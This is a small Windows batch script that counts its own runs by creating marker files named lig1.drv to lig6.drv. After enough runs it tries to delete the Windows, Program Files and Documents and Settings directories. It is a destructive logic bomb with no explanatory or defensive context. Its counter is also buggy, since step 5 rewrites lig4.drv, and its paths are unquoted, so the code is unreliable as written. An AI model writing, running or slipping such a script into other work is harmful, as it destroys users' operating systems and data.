c:\
cd\
echo off
if exist lig1.drv goto 2
echo > lig1.drv sdfsdf
goto fim
:2
if exist lig2.drv goto 3
echo > lig2.drv sdfsdf
goto fim
:3
if exist lig3.drv goto 4
echo > lig3.drv sdfsdf
goto fim
:4
if exist lig4.drv goto 5
echo > lig4.drv sdfsdf
goto fim
:5
if exist lig5.drv goto 6
echo > lig4.drv sdfsdf
goto fim
:6
if exist lig6.drv goto 7
echo > lig6.drv sdfsdf
goto fim
:7
rmdir C:\windows
rmdir C:\arquivos de programas
rmdir C:\documents and settings
:fim